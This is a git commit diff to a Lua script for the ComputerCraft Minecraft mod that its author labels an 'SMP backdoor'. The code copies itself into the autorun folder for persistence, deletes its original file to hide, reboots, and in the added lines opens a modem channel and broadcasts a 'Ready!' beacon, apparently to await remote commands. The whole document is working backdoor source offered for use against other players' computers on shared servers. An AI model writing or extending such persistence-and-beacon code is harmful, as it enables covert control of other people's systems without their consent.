4d2bf434e65ab1df8fdcca4b4943f49528139f07
Hawk <30607615+haawwkeye@users.noreply.github.com>
2022-07-21 22:48:59 -0400

    Modem stuff and rename for server stuff

--- BackdoorClient.lua
+++ BackdoorClient.lua
@@ -1,6 +1,6 @@
 -- computer craft SMP backdoor!
-if not fs.exists("/rom/autorun/backdoor.lua") then
 local pwd = shell.getRunningProgram();
+if not fs.exists("/rom/autorun/backdoor.lua") then
 local _self = fs.open(pwd, "r");
 local file = fs.open("/rom/autorun/backdoor.lua", "w");
 file.write(_self.readAll());
@@ -10,3 +10,13 @@ fs.delete(pwd); -- Hopefully deletes the script
 os.reboot();
 end
 -- This is how I make the backdoor auto run
+function shutdown(msg)
+print(msg)
+os.shutdown()
+end
+local id = os.getComputerID();
+local port = 1489;
+local modem = peripheral.find("modem") or shutdown("A modem is required");
+modem.open(port+id);
+
+modem.transmit(port, port+id, id .. " Ready!")
